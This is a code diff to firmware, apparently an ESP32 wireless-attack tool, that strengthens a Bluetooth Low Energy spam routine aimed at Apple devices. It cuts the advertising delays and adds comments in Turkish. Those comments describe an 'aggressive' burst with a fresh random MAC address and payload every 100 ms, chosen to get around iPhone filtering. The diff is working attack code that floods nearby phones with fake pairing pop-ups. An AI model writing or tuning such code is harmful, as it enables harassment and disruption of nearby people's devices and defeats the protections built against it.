@@ -4897,41 +4897,47 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
 #endif
 
     pAdvertising->start();
-    delay(500);
+    delay(100);
     pAdvertising->stop();
 
-    delay(10);
+    delay(5);
 
     NimBLEDevice::deinit();
   } else if (type == Apple) {
-    if ((now_time - this->last_sour_apple_update > 1000) ||
+    // Agresif Apple BLE Spam: Her 100ms'de yeni MAC + yeni payload
+    if ((now_time - this->last_sour_apple_update > 100) ||
         (this->last_sour_apple_update == 0) || (!this->ble_initialized)) {
+      
+      // Onceki BLE oturumunu kapat (temiz baslangic)
+      if (this->ble_initialized) {
+        pAdvertising->stop();
+        delay(5);
+        NimBLEDevice::deinit();
+        this->ble_initialized = false;
+        delay(5);
+      }
+      
+      // Her seferinde yeni rastgele MAC adresi (iPhone filtresini atlatir)
+      generateRandomMac(macAddr);
       this->setBaseMacAddress(macAddr);
 
       NimBLEDevice::init("");
       NimBLEServer *pServer = NimBLEDevice::createServer();
-
       pAdvertising = pServer->getAdvertising();
-
-      delay(40);
+      delay(10);
 
       NimBLEAdvertisementData advertisementData =
           this->GetUniversalAdvertisementData(Apple);
       pAdvertising->setAdvertisementData(advertisementData);
 
       this->ble_initialized = true;
-    }
-
-    pAdvertising->start();
-    delay(60);
-    pAdvertising->stop();
-
-    if ((now_time - this->last_sour_apple_update > 1000) ||
-        (this->last_sour_apple_update == 0)) {
       this->last_sour_apple_update = now_time;
-      NimBLEDevice::deinit();
-      this->ble_initialized = false;
     }
+
+    // Kisa ama agresif reklam patlamasi
+    pAdvertising->start();
+    delay(20);
+    pAdvertising->stop();
   } else if (type == Airtag) {
     for (int i = 0; i < airtags->size(); i++) {
       if (airtags->get(i).selected) {
